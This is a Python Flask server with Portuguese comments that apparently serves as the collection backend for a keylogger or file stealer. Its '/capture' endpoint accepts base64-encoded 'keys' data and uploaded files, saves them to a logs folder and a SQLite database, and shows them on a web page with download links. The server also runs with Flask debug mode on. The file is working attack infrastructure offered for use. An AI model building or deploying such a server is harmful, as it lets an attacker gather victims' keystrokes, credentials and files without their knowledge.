from flask import Flask, request, jsonify, render_template, send_from_directory
import os
import base64
import datetime
import werkzeug
import sqlite3

app = Flask(__name__)


ip = input("Digite o seu ip: ")
porta = int(input("Digite a porta do servidor: "))
app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024  

UPLOAD_FOLDER = "logs"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

DB_FILE = "logs.db"

def init_db():
    """Inicializa o banco de dados SQLite"""
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                filename TEXT NOT NULL,
                content TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        """)
        conn.commit()

init_db()

@app.route("/", methods=["GET"])
def index():
    """Exibe os logs e arquivos armazenados"""
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT id, filename, content, timestamp FROM logs ORDER BY timestamp DESC")
        logs = cursor.fetchall()

    return render_template("index.html", logs=logs)

@app.route('/capture', methods=['POST'])
def capture():
    print(f"Request recebido com data: {request.form}")  
    print(f"Arquivos recebidos: {request.files}")  

    response_data = {}

    # Processar logs enviados em base64
    if "keys" in request.form:
        try:
            log_data = base64.b64decode(request.form["keys"]).decode("utf-8", errors="ignore")
            log_filename = f"log_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
            log_filepath = os.path.join(UPLOAD_FOLDER, log_filename)

            with open(log_filepath, "w", encoding="utf-8") as f:
                f.write(log_data)

            # Armazena no banco de dados
            with sqlite3.connect(DB_FILE) as conn:
                cursor = conn.cursor()
                cursor.execute("INSERT INTO logs (filename, content) VALUES (?, ?)", (log_filename, log_data))
                conn.commit()

            print(f"[+] Log salvo em: {log_filepath}")
            response_data["log"] = {"message": "Log recebido", "file": log_filename}

        except Exception as e:
            return jsonify({"error": f"Erro ao processar log: {str(e)}"}), 400

    # Processar arquivos enviados
    if "file" in request.files:
        file = request.files["file"]
        
        if file.filename == "":
            return jsonify({"error": "Arquivo sem nome"}), 400

        filename = werkzeug.utils.secure_filename(file.filename)
        filename = f"{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}_{filename}"
        filepath = os.path.join(UPLOAD_FOLDER, filename)

        file_content = file.read()
        print(f"Arquivo recebido: {filename}, tamanho: {len(file_content)} bytes")  

        # Verifica se o arquivo tem conteúdo antes de salvar
        if len(file_content) == 0:
            return jsonify({"error": "Arquivo vazio"}), 400
        
        file.seek(0)  # Volta para o início antes de salvar
        file.save(filepath)

        # Se for um arquivo de texto, armazenamos seu conteúdo no banco de dados
        try:
            content = file_content.decode("utf-8")
        except UnicodeDecodeError:
            content = None  # Arquivo binário, não salva o conteúdo no banco

        # Armazena no banco de dados
        with sqlite3.connect(DB_FILE) as conn:
            cursor = conn.cursor()
            cursor.execute("INSERT INTO logs (filename, content) VALUES (?, ?)", (filename, content))
            conn.commit()

        print(f"[+] Arquivo salvo em: {filepath}")
        response_data["file"] = {"message": "Arquivo recebido", "file": filename}

    if not response_data:
        return jsonify({"error": "Nenhum dado recebido"}), 400

    return jsonify(response_data), 200

@app.route('/download/<filename>')
def download_file(filename):
    """Permite o download de um arquivo armazenado"""
    return send_from_directory(UPLOAD_FOLDER, filename, as_attachment=True)

if __name__ == "__main__":
    HOST = ip
    PORT = porta
    print(f"[+] Servidor rodando em http://{HOST}:{PORT}")
    app.run(host=HOST, port=PORT, debug=True)
          
